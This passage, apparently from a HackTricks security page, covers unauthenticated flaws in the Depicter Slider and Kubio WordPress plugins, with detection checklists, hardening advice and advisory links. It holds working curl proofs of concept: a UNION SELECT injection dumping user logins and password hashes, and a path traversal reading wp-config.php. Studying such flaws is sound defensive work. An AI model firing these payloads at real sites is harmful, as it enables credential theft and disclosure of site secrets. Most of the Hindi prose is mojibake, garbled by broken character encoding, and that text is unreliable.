- Nonces рдХреЛ рдХреЗрд╡рд▓ CSRF tokens рдХреЗ рд░реВрдк рдореЗрдВ рд╣реА рдорд╛рдиреЗрдВ; nonce рдХреА рд╕реНрдерд┐рддрд┐ рдХреЗ рдмрд╛рд╡рдЬреВрдж capability checks рд▓рд╛рдЧреВ рдХрд░реЗрдВ
- installer code рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ current_user_can('install_plugins') рдФрд░ current_user_can('activate_plugins') рдЖрд╡рд╢реНрдпрдХ рдХрд░реЗрдВ
- рдЕрдкреНрд░рдорд╛рдгреАрдХреГрдд рдкрд╣реБрдБрдЪ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ; privileged flows рдХреЗ рд▓рд┐рдП nopriv AJAX actions рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рдиреЗ рд╕реЗ рдмрдЪреЗрдВ

---

## рдЕрдкреНрд░рдорд╛рдгреАрдХреГрдд SQLi depicter-* actions рдореЗрдВ s (search) parameter рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (Depicter Slider тЙд 3.6.1)

рдХрдИ depicter-* actions рдиреЗ s (search) parameter рдХреЛ рд▓рд┐рдпрд╛ рдФрд░ рдЙрд╕реЗ parameterization рдХреЗ рдмрд┐рдирд╛ SQL queries рдореЗрдВ concatenated рдХрд┐рдпрд╛ред

- Parameter: s (search)
- Flaw: WHERE/LIKE clauses рдореЗрдВ рд╕реАрдзреЗ string concatenation; рдХреЛрдИ prepared statements/sanitization рдирд╣реАрдВ
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
рдбрд┐рдЯреЗрдХреНрд╢рди рдЪреЗрдХрд▓рд┐рд╕реНрдЯ
- depicter-* action handlers рдХреЗ рд▓рд┐рдП Grep рдХрд░реЗрдВ рдФрд░ SQL рдореЗрдВ $_GET['s'] рдпрд╛ $_POST['s'] рдХрд╛ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧ рджреЗрдЦреЗрдВ
- $wpdb->get_results()/query() рдХреЛ рдкрд╛рд╕ рдХрд┐рдП рдЧрдП рдХрд╕реНрдЯрдо рдХреНрд╡реЗрд░реАрдЬрд╝ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░реЗрдВ рдЬреЛ s рдХреЛ рдЬреЛрдбрд╝рддреА рд╣реИрдВ

рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ
- рд╣рдореЗрд╢рд╛ $wpdb->prepare() рдпрд╛ wpdb placeholders рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ; рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ рдЕрдирдкреЗрдХреНрд╖рд┐рдд metacharacters рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ
- s рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рдЦреНрдд allowlist рдЬреЛрдбрд╝реЗрдВ рдФрд░ рдЕрдкреЗрдХреНрд╖рд┐рдд charset/length рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╕рд╛рдорд╛рдиреНрдпреАрдХреГрдд рдХрд░реЗрдВ

---

## рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгрд┐рдХрд░рдг Local File Inclusion рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдорд╛рдиреНрдпреАрдХреГрдд template/file path (Kubio AI Page Builder тЙд 2.5.1)

Normalization/containment рдХреЗ рдмрд┐рдирд╛ template рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ attacker-controlled paths рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рд╕реЗ arbitrary local files рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ, рдФрд░ рдХрднреА-рдХрднреА code execution рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЕрдЧрд░ includable PHP/log files runtime рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░ рджрд┐рдП рдЬрд╛рдПрдБред

- Parameter: __kubio-site-edit-iframe-classic-template
- рдХрдордЬрд╝реЛрд░реА: рдХреЛрдИ normalization/allowlisting рдирд╣реАрдВ; traversal рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ
- рдкреНрд░рднрд╛рд╡: рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЦреБрд▓рд╛рд╕рд╛ (wp-config.php), рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд RCE (log poisoning, includable PHP)

PoC тАУ wp-config.php рдкрдврд╝реЗрдВ
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЪреЗрдХрд▓рд┐рд╕реНрдЯ
- рдХреЛрдИ рднреА handler рдЬреЛ рдЕрдиреБрд░реЛрдз рдкрд╛рдереНрд╕ рдХреЛ include()/require()/read sinks рдореЗрдВ рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдмрд┐рдирд╛ realpath() containment рдХреЗ
- traversal patterns (../) рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬреЛ intended templates directory рдХреЗ рдмрд╛рд╣рд░ рдкрд╣реБрдБрдЪ рд░рд╣реЗ рд╣реЛрдВ

рдХрдареЛрд░рдХрд░рдг
- Enforce allowlisted templates; resolve with realpath() and require str_starts_with(realpath(file), realpath(allowed_base))
- рдЗрдирдкреБрдЯ рдХреЛ Normalize рдХрд░реЗрдВ; traversal sequences рдФрд░ absolute paths рдХреЛ reject рдХрд░реЗрдВ; sanitize_file_name() рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЗрд╡рд▓ filenames рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВ (not full paths)


## рд╕рдВрджрд░реНрдн

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset тАУ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments тЙд 5.6.1 тАУ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation тАУ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025тАЩs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) тЙд 1.0.82 тАУ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations тЙд 3.5.3 тАУ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider тЙд 3.6.1 тАУ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder тЙд 2.5.1 тАУ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
